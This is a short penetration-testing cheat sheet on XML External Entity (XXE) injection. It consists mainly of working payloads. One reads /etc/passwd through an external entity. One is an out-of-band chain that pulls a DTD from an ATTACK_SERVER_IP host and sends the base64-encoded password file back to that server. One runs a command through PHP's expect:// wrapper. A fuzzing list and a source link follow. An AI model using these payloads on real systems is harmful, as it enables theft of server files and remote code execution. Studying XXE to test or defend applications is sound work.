# XXE - XML External Entity Injection

## Payloads

### File Extraction

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

```markup
# file.dtd; hosted by attack web server
<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://ATTACK_SERVER_IP:80/?p=%payl;'>">

# XML payload to vulnerable server
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM"http://ATTACK_SERVER_IP:80/file.dtd">%remote;%int;%trick;]>
```

### Remote Code Execution

If PHP "expect" module is loaded:

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

## Fuzzing

[https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)

## Sources

{% embed url="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection" %}
